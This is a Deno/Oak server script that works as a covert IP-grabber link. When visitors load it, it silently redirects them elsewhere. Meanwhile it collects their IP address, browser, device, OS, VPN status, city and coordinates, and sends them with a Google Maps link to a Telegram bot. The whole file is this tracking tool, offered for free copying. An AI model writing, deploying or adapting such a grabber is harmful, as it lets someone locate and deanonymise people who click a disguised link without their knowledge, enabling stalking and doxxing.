// Created by Moa-yad
// Intended for personal use only
// You can copy and modify with complete freedom

import { Application, Router } from "https://deno.land/x/oak/mod.ts";
import userAgent from 'https://deno.land/x/user_agent@v0.1.4/mod.ts';
import ipapi from 'https://deno.land/x/ipapi/mod.js'
import { getEmojiByName } from "https://deno.land/x/getmoji@1.2.4/mod.ts";

const app = new Application();
const router = new Router();

router.get("/", async (ctx) => {
  
  const userAgentString = ctx.request.headers.get("user-agent");
  const { browser, device, os } = userAgent(userAgentString);
  
  const ip = ctx.request.ip;
  ctx.response.redirect(`${Deno.env.get("URL")}`);
  const info = await ipapi(`${ip}`);
  const bot = `https://api.telegram.org/bot${Deno.env.get("TOKEN")}/sendMessage`
  const countryinfo = `**COUNTRY** : \`${info.country}\`` + await getEmojiByName(`flag-${info.countryCode}`.toLowerCase());
  const userAgentString_v = `**userAgentString** : \`\`\`ts ${userAgentString}\`\`\``
  const text = `${countryinfo}` +
    `\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n` +
    `**VPN** : \`${info.proxy}\`` +
    `\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n` +
    `**DEVICE** : ${device.type}` +
    `\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n` +
    `**BROWSER** : ${browser.name}` +
    `\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n` +
    `**SYSTEM** : ${os.name}` +
    `\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n` +
    `**userAgent** : \`\`\`json ${userAgentString}\`\`\``;
  
  const button = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: Deno.env.get("ID"),
      text: text,
      parse_mode: "markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: `${ip}`, url: `https://ip2location.io/${ip}` },
            { text: `${info.city}`, url: `https://www.google.com/maps/search/?api=1&query=${info.lat}%2C${info.lon}` }
          ]
        ]
      }
    })
  };
   await fetch(bot, button);

});

app.use(router.routes());
app.use(router.allowedMethods());

await app.listen({ port: 8000 });
